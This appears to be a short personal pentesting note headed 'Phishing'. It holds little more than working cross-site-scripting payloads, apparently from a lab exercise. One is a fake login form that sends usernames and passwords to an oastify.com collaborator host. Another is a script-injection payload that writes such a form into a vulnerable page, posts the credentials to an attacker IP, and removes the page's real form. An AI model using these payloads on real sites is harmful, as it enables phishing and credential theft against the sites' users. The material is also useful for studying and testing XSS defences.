# Phishing

```html
'><script>alert(1)</script>
```

![Pasted image 20240927184620.png](../../assets/images/5ddb1923680cae9ce7c4.png)
## Login Form Injection 

```html
<h3>Please login to continue</h3>
<form action=http://r3v71geba4s557x48hdxvnufa6gx4nsc.oastify.com>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

```html
'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.15.60><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
```

![Pasted image 20240927185229.png](../../assets/images/4e2ef65f3c52b8acbe43.png)
